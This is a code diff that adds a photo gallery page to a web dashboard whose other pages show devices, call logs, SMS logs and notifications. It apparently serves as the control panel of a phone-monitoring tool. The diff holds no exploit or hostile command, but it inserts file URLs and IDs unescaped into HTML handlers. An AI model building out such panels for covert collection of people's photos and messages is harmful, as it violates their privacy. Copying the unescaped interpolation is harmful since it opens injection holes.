@@ -266,6 +266,41 @@
   .badge-online { background: rgba(61,214,140,.15); color: var(--green); }
   .badge-offline{ background: rgba(247,83,79,.15); color: var(--red); }
 
+  /* ── Gallery ────────────────────────────────────── */
+  .photo-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    cursor: pointer;
+    transition: transform .15s, border-color .15s;
+    position: relative;
+  }
+  .photo-card:hover { transform: translateY(-3px); border-color: var(--accent); }
+  .photo-card img {
+    width: 100%; aspect-ratio: 1;
+    object-fit: cover; display: block;
+    background: var(--border);
+  }
+  .photo-card .photo-meta {
+    padding: 8px 10px;
+    font-size: 11px; font-family: var(--mono); color: var(--muted);
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .photo-card .photo-del {
+    position: absolute; top: 6px; right: 6px;
+    background: rgba(247,83,79,.85); color: #fff; border: none;
+    border-radius: 6px; padding: 3px 7px; font-size: 11px;
+    cursor: pointer; display: none;
+  }
+  .photo-card:hover .photo-del { display: block; }
+  .photo-card .photo-badge {
+    position: absolute; top: 6px; left: 6px;
+    background: rgba(0,0,0,.6); color: #fff;
+    font-size: 10px; font-family: var(--mono);
+    padding: 2px 6px; border-radius: 4px;
+  }
+
   /* ── Mono text ──────────────────────────────────── */
   .mono { font-family: var(--mono); font-size: 12px; color: var(--muted); }
   .ellipsis { max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
@@ -404,6 +439,10 @@
     <div class="nav-section">Tools</div>
     <div class="nav-item" onclick="showPage('search')">
       <span class="nav-icon">🔍</span> Search
+    </div>
+    <div class="nav-item" onclick="showPage('gallery')">
+      <span class="nav-icon">🖼️</span> Gallery
+      <span class="nav-badge" id="badge-gallery">0</span>
     </div>
   </nav>
 
@@ -584,6 +623,37 @@
       <div id="search-results"></div>
     </div>
 
+    <!-- ── GALLERY PAGE ──────────────────────────── -->
+    <div class="page" id="page-gallery">
+      <div id="gallery-toolbar" style="display:flex;gap:8px;margin-bottom:16px;align-items:center;flex-wrap:wrap">
+        <span id="gallery-count" class="mono" style="color:var(--muted)">Loading...</span>
+        <div style="margin-left:auto;display:flex;gap:8px">
+          <button class="btn-refresh" onclick="loadGallery()" style="font-size:12px">⟳ Refresh</button>
+          <button class="btn-refresh" onclick="galleryViewMode('grid')" id="btn-grid" style="font-size:12px">⊞ Grid</button>
+          <button class="btn-refresh" onclick="galleryViewMode('list')" id="btn-list" style="font-size:12px">≡ List</button>
+        </div>
+      </div>
+      <div id="gallery-grid" style="
+        display:grid;
+        grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
+        gap:12px;
+      "></div>
+      <div class="pagination" id="gallery-pagination"></div>
+    </div>
+
+    <!-- Lightbox -->
+    <div id="lightbox" style="
+      display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);
+      z-index:9999;align-items:center;justify-content:center;flex-direction:column;
+    " onclick="closeLightbox()">
+      <img id="lb-img" style="max-width:90vw;max-height:85vh;border-radius:8px;object-fit:contain" />
+      <div id="lb-info" style="color:#fff;font-size:12px;font-family:var(--mono);margin-top:12px;text-align:center"></div>
+      <button onclick="closeLightbox()" style="
+        position:fixed;top:16px;right:16px;background:none;border:none;
+        color:#fff;font-size:28px;cursor:pointer;line-height:1
+      ">✕</button>
+    </div>
+
   </div><!-- /content -->
 </div><!-- /main -->
 
@@ -669,7 +739,8 @@ function showPage(name) {
   document.querySelector(`.nav-item[onclick="showPage('${name}')"]`)?.classList.add('active');
   document.getElementById('page-title').textContent =
     { dashboard:'Dashboard', devices:'Devices', calls:'Call Logs',
-      sms:'SMS Logs', notifications:'Notifications', search:'Search' }[name] || name;
+      sms:'SMS Logs', notifications:'Notifications', search:'Search',
+      gallery:'Gallery' }[name] || name;
   currentPage = name;
   loadPage(name);
 }
@@ -682,6 +753,7 @@ function loadPage(name) {
   else if (name === 'calls') loadCalls();
   else if (name === 'sms') loadSms();
   else if (name === 'notifications') loadNotifications();
+  else if (name === 'gallery') loadGallery();
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -715,6 +787,8 @@ async function populateDeviceDropdown() {
 function loadAll() {
   populateDeviceDropdown();
   loadDashboard();
+  // Pre-load gallery badge count
+  api('/api/gallery?limit=1').then(r => setBadge('badge-gallery', r.total || 0)).catch(()=>{});
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -1010,6 +1084,102 @@ function timeAgo(ts) {
 window.addEventListener('load', () => {
   connectServer();
 });
+// ─────────────────────────────────────────────────────────────
+//  Gallery
+// ─────────────────────────────────────────────────────────────
+let galleryPage = 1;
+let galleryMode = 'grid';
+
+async function loadGallery() {
+  const grid = document.getElementById('gallery-grid');
+  grid.innerHTML = '<div class="loading"><div class="spinner"></div>Loading photos...</div>';
+
+  try {
+    const qs = new URLSearchParams({ page: galleryPage, limit: 50 });
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    console.log(qs);
+    const r = await api(`/api/gallery?${qs}`);
+
+    // Update badge
+    setBadge('badge-gallery', r.total || 0);
+    document.getElementById('gallery-count').textContent =
+      `${r.total || 0} photos${deviceFilter ? ' (filtered)' : ''}`;
+
+    if (!r.data || r.data.length === 0) {
+      grid.innerHTML = '<div class="empty"><div class="empty-icon">🖼️</div>No photos yet</div>';
+      document.getElementById('gallery-pagination').innerHTML = '';
+      return;
+    }
+
+    if (galleryMode === 'grid') {
+      grid.style.gridTemplateColumns = 'repeat(auto-fill,minmax(160px,1fr))';
+      grid.innerHTML = r.data.map(p => `
+        <div class="photo-card" onclick="openLightbox('${p.file_url}','${esc(p.file_name)}','${esc(p.device_name)}','${fmt(p.timestamp)}','${p.width}x${p.height}')">
+          <div class="photo-badge">${esc((p.device_name||'').slice(0,10))}</div>
+          <img src="${p.file_url}" loading="lazy" onerror="this.src='data:image/svg+xml,<svg xmlns=\\'http://www.w3.org/2000/svg\\'><rect width=\\'100%\\' height=\\'100%\\' fill=\\'%23252a35\\'/></svg>'" />
+          <div class="photo-meta">${esc(p.file_name)}</div>
+          <div class="photo-meta" style="margin-top:-6px">${fmt(p.timestamp)}</div>
+          <button class="photo-del" onclick="event.stopPropagation();deletePhoto('${p._id}',this.closest('.photo-card'))">🗑</button>
+        </div>`).join('');
+    } else {
+      grid.style.gridTemplateColumns = '1fr';
+      grid.innerHTML = `
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Preview</th><th>File</th><th>Device</th><th>Size</th><th>Dimensions</th><th>Time</th><th></th></tr></thead>
+            <tbody>
+              ${r.data.map(p => `
+                <tr>
+                  <td><img src="${p.file_url}" style="width:56px;height:56px;object-fit:cover;border-radius:6px;cursor:pointer"
+                    onclick="openLightbox('${p.file_url}','${esc(p.file_name)}','${esc(p.device_name)}','${fmt(p.timestamp)}','${p.width}x${p.height}')"
+                    onerror="this.style.display='none'" loading="lazy" /></td>
+                  <td class="ellipsis" style="max-width:180px">${esc(p.file_name)}</td>
+                  <td class="mono" style="font-size:11px">${esc(p.device_name||'')}</td>
+                  <td class="mono">${p.file_size ? (p.file_size/1024).toFixed(0)+'KB' : '—'}</td>
+                  <td class="mono">${p.width && p.height ? p.width+'×'+p.height : '—'}</td>
+                  <td class="mono">${fmt(p.timestamp)}</td>
+                  <td><button class="btn-refresh" style="padding:4px 8px;font-size:11px" onclick="deletePhoto('${p._id}',null)">🗑</button></td>
+                </tr>`).join('')}
+            </tbody>
+          </table>
+        </div>`;
+    }
+
+    renderPagination('gallery-pagination', galleryPage, r.total, 50, p => { galleryPage = p; loadGallery(); });
+  } catch (e) {
+    grid.innerHTML = `<div class="alert alert-error">Error: ${e.message}</div>`;
+  }
+}
+
+function galleryViewMode(mode) {
+  galleryMode = mode;
+  document.getElementById('btn-grid').style.color = mode === 'grid' ? 'var(--accent)' : '';
+  document.getElementById('btn-list').style.color = mode === 'list' ? 'var(--accent)' : '';
+  loadGallery();
+}
+
+async function deletePhoto(id, card) {
+  if (!confirm('Delete this photo?')) return;
+  try {
+    await api(`/api/gallery/${id}`, 'DELETE');
+    if (card) card.remove();
+    else loadGallery();
+  } catch (e) { showError('Delete failed: ' + e.message); }
+}
+
+function openLightbox(url, name, device, time, dims) {
+  const lb = document.getElementById('lightbox');
+  document.getElementById('lb-img').src = url;
+  document.getElementById('lb-info').textContent = `${name}  •  ${device}  •  ${dims}  •  ${time}`;
+  lb.style.display = 'flex';
+  document.body.style.overflow = 'hidden';
+}
+function closeLightbox() {
+  document.getElementById('lightbox').style.display = 'none';
+  document.body.style.overflow = '';
+}
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeLightbox(); });
+
 </script>
 </body>
 </html>
